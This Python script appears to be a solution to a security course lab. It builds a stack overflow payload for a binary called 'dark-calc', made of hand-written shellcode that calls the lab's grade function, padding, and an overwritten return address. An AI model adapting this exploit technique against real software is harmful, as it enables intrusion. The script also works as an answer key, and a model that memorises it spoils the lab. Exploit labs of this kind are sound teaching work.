#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import struct
import sys

GRADE_EVAL   = 0x401A87
EXIT_PLT     = 0x401880
BUFFER_ADDR  = 0x721000800FD0   # input(): rbp-0x10, fixed by __wrap_main


def main() -> None:
    shellcode = b""
    shellcode += b"\x6a\x04"                              # push 4
    shellcode += b"\x5f"                                  # pop rdi
    shellcode += b"\xb8" + struct.pack("<I", GRADE_EVAL)  # mov eax, grade_eval
    shellcode += b"\xff\xd0"                              # call rax
    shellcode += b"\xc3"                                  # ret -> exit@plt

    payload = shellcode
    payload += b"\x90" * (0x18 - len(shellcode))          # pad up to saved RBP
    payload += struct.pack("<Q", BUFFER_ADDR)             # overwrite return addr
    payload += struct.pack("<Q", EXIT_PLT)                # [rsp] after `ret`

    assert len(payload) == 0x28, len(payload)
    assert b"\x0a" not in payload
    sys.stdout.buffer.write(payload)


if __name__ == "__main__":
    main()
